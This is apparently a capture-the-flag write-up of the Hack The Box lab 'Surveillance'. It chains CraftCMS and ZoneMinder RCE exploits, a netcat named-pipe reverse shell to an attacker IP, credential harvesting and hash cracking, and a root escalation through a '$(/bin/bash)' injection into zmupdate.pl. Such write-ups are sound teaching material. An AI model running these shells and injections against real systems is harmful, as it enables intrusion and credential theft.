---
name: Surveillance
difficulty: Medium
os: Linux
thumbnail: https://labs.hackthebox.com/storage/avatars/d2ddffcb2eced6a4d5486dc99d440d1a.png
active: false
---

Starting off with the nmap:
```bash
Nmap scan report for surveillance.htb (10.10.11.245)
Host is up (0.038s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title:  Surveillance
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Visiting the website we don't find anything too interesting.

When we enumerate directories we can find `/admin`

```bash
$ ffuf -u http://surveillance.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o ffuf.out

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://surveillance.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Output file      : ffuf.out
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 47ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 61ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 59ms]
img                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 43ms]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 325ms]
```

## CraftCMS

Navigating to [http://surveillance.htb/](http://surveillance.htb/) brings us to a CraftCMS login page.

![](/images/htb/surveillance/craftCMSLogin.png)

Quick Google on CraftCMS and you'll find `CVE-2023-41892`, an unauthenticated RCE: [https://blog.calif.io/p/craftcms-rce](https://blog.calif.io/p/craftcms-rce]
Here's a POC we can use, though the shell is pretty bad so I used it to make a new one: [https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce)

```bash
$ python3 CVE-2023-41892.py http://surveillance.htb
[-] Get temporary folder and document root ...
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ rm -f /tmp/cinder;mknod /tmp/cinder p;cat /tmp/cinder|/bin/sh -i 2>&1|nc 10.10.15.64 4444 >/tmp/cinder
```

```bash
$ whoami
www-data
```

We can now run linpeas to get some good information.

Some interesting env vars
```bash
-rw-r--r-- 1 www-data www-data 836 Oct 21 18:32 /var/www/html/craft/.env
CRAFT_SECURITY_KEY=2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craftdb
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftCMSPassword2023!
```

Password for ZoneMinder
```bash
-rw-r--r-- 1 root zoneminder 3503 Oct 17 11:32 /usr/share/zoneminder/www/api/app/Config/database.php
       public $test = array(
                'datasource' => 'Database/Mysql',
                'persistent' => false,
                'host' => 'localhost',
                'login' => 'zmuser',
                'password' => 'ZoneMinderPassword2023',
                'database' => 'zm',
        );
```

We can look through the database when signing in as craftuser:
```bash
mysql -u craftuser -p
Enter password: CraftCMSPassword2023!
> use craftdb;
> select * from users;
| username | fullName  | email                  | password                                                     |
|----------|-----------|------------------------|--------------------------------------------------------------|
| admin    | Matthew B | admin@surveillance.htb | $2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe |
```

We can try and crack it with hashcat, but it doesn't get any matches. After enumerating the craftdb files you can easily find an old backup of the database.
```bash
$ ls ~/html/craft/storage/backups
surveillance--2023-10-17-202801--v4.4.14.sql.zip
```

Inside you'll find the same tables, same user, but instead with an older hash. Go ahead and crack it with hashcat:
```bash
hashcat -m 1400 -a 0 '39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec' /usr/share/wordlist/rockyou.txt
starcraft122490
```

## User matthew

Now that we have Matthew's password we can finally ssh into the machine:
```bash
$ ssh matthew@surveillance.htb
matthew@surveillance.htb's password: starcraft122490
```

Now I need to enumerate more, `sudo -l` doesn't give us anything.

If you look at active ports or the nginx config, you'll find port `8080` operates the ZoneMinder web panel.
```bash
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

We can forward this port now that we have ssh:
```bash
$ ssh -L 8080:localhost:8080 matthew@surveillance.htb
```

Navigating to [http://localhost:8080/](http://localhost:8080/) shows us the ZoneMinder login panel. The user/pass is:
`User: admin`
`Pass: starcraft122490`

![](/images/htb/surveillance/zmPanel.png)

Looking at the panel you can see that it's running version 1.36.32 which is weak to `CVE-2023–26035`.
This is another unauthenticated RCE, letting you craft a CRFS token and exploit a vulnerable API endpoint.

We can use a public POC for this, similar to CraftCMS to create a reverse shell: [https://github.com/rvizx/CVE-2023-26035](https://github.com/rvizx/CVE-2023-26035)
```bash
python3 exploit.py -t http://127.0.0.1:8080/ -ip 10.10.15.64 -p 4444
[+] fetching csrf token
[+] received the token: key:a1e0b6f7f41cd10f65ac4ac73dc37cadf231ac6_1702352826
[+] executing...
[+] sending payload...
$ whoami
zoneminder
```

# User zoneminder
Again trying for `sudo -l` we find this binary:
```bash
$ sudo -l
User zoneminder may run the following commands on surveillance:
	(ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
```

So we'll start to look for a privilege escalation. Let's see what files are available:
```bash
$ ls /usr/bin/zm*.pl
/usr/bin/zmaudit.pl       /usr/bin/zmcamtool.pl     /usr/bin/zmcontrol.pl     /usr/bin/zmdc.pl          /usr/bin/zmfilter.pl
/usr/bin/zmonvif-probe.pl /usr/bin/zmpkg.pl         /usr/bin/zmrecover.pl     /usr/bin/zmstats.pl       /usr/bin/zmsystemctl.pl
/usr/bin/zmtelemetry.pl   /usr/bin/zmtrack.pl       /usr/bin/zmtrigger.pl     /usr/bin/zmupdate.pl      /usr/bin/zmvideo.pl
/usr/bin/zmwatch.pl       /usr/bin/zmx10.pl
```

We can grep for keywords like `system`, `exec`, `qx` to find an injection. `zmupdate.pl` calls `qx()` which we can use to inject.
Vulnerable code:
```perl
    my $command = 'mysqldump';
    if ($super) {
        $command .= ' --defaults-file=/etc/mysql/debian.cnf';
    }
    elsif ($dbUser) {
        $command .= ' -u' . $dbUser;
        $command .= ' -p\'' . $dbPass . '\'' if $dbPass;
    }
    if ( defined($portOrSocket) ) {
        if ( $portOrSocket =~ /^\// ) {
            $command .= ' -S' . $portOrSocket;
        }
        else {
            $command .= ' -h' . $host . ' -P' . $portOrSocket;
        }
    }
    else {
        $command .= ' -h' . $host;
    }
    my $backup = '/tmp/zm/' . $Config{ZM_DB_NAME} . '-' . $version . '.dump';
    $command .=
      ' --add-drop-table --databases ' . $Config{ZM_DB_NAME} . ' > ' . $backup;
    print("Creating backup to $backup. This may take several minutes.\n");
    ($command) = $command =~ /(.*)/;    # detaint
```

After understanding how `zmupdate.pl` works, we can figure out what parameters it requires.
The `-u (user)` is the route of our injection, which we can use to simply spawn a shell and escalate.
```bash
$ sudo /usr/bin/zmupdate.pl --version 10 -u '$(/bin/bash)'
$ whoami
root
```